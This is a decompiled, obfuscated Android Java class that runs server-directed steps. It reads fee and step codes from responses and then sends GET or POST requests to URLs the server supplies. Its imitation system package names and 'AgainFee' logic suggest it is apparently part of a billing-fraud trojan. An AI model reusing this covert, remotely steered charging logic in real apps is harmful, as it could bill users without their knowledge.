package com.android.mm.process;

import android.content.Context;
import android.os.Handler;
import android.text.TextUtils;
import android.util.Log;
import com.android.intent.http.i;
import com.android.intent.http.j;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.message.BasicNameValuePair;

public final class f
  implements i, j
{
  public com.android.dd.data.b a;
  public com.android.ll.logic.c b = new com.android.ll.logic.c();
  String c = "";
  String d = "111111";
  Handler e = new e(this);
  int f = 1;
  com.android.dd.data.e g;
  private c h = null;
  private Context i;
  private String j = "1";
  
  public f() {}
  
  public f(Context paramContext, com.android.dd.data.b paramB)
  {
    this.i = paramContext;
    this.a = paramB;
    this.h = new c();
  }
  
  private String a(String paramString)
  {
    String str2 = "";
    String str1 = str2;
    if (!TextUtils.isEmpty(this.a.n()))
    {
      str1 = str2;
      if (!TextUtils.isEmpty(this.a.m()))
      {
        str1 = str2;
        if (paramString.indexOf(this.a.n()) > 0)
        {
          int k = paramString.indexOf(this.a.n());
          int m = paramString.indexOf("\"", k);
          Log.d("fmz", "begenindex = " + k + "   endindex = " + m);
          str1 = this.a.m() + paramString.substring(k, m);
        }
      }
    }
    return str1;
  }
  
  private void a(String paramString1, String paramString2)
  {
    if (this.g != null) {}
    for (String str = this.g.c();; str = this.a.g())
    {
      com.android.toast.log.a.a("fmz", "freeUrl = " + str);
      com.android.ll.logic.c.a(this.a.f(), this.j, this.a.q(), str, this.a.b(), paramString1 + "AB", paramString2, this, this.i);
      return;
    }
  }
  
  private void b(String paramString)
  {
    int k;
    String str;
    Object localObject;
    if (!TextUtils.isEmpty(paramString))
    {
      if (!paramString.contains("csendtype=post&")) {
        break label147;
      }
      k = paramString.indexOf("csendtype=post&");
      int m = "csendtype=post&".length();
      str = paramString.substring(0, k);
      localObject = paramString.substring(k + m, paramString.length());
      paramString = new ArrayList();
      localObject = ((String)localObject).split("\\&");
      if ((localObject != null) && (localObject.length > 0)) {
        k = 0;
      }
    }
    for (;;)
    {
      if (k >= localObject.length)
      {
        a(str, paramString);
        return;
      }
      String[] arrayOfString = localObject[k].split("\\=");
      if ((arrayOfString != null) && (arrayOfString.length > 1)) {
        paramString.add(new BasicNameValuePair(arrayOfString[0], arrayOfString[1]));
      }
      k += 1;
    }
    label147:
    a(paramString.replace("csendtype=get&", ""), null);
  }
  
  public final void a(String paramString, List paramList)
  {
    Log.d("fmz", "yurl1 = " + paramString);
    new b(this, paramString, paramList).start();
  }
  
  public final void response1(Object paramObject, boolean paramBoolean, String paramString)
  {
    this.f += 1;
    if (paramObject != null)
    {
      this.g = ((com.android.dd.data.e)paramObject);
      if (this.g.d() != null) {}
    }
    else
    {
      return;
    }
    com.android.toast.log.a.a("fmz", "case : " + this.g.d());
    this.j = this.g.f();
    com.android.toast.log.a.a("fmz", "stepid =  " + this.j);
    switch (Integer.parseInt(this.g.d().toString().trim()))
    {
    default: 
      return;
    case 1: 
      this.b.a(this.a.a(), this.a.f(), "1", com.android.dd.data.a.n, "1", "", this, this.i);
      return;
    case 2: 
      com.android.toast.log.a.a("fmz", "AgainFee : " + this.g.e());
      if (this.g.e().trim().equals("0"))
      {
        this.b.a(this.a.a(), this.a.f(), "1", com.android.dd.data.a.n, "0", "", this, this.i);
        return;
      }
      b(this.g.b());
      return;
    }
    com.android.toast.log.a.a("fmz", "stepid : " + this.j);
    b(this.g.c());
  }
  
  public final void responseLog(Object paramObject, boolean paramBoolean, String paramString) {}
}
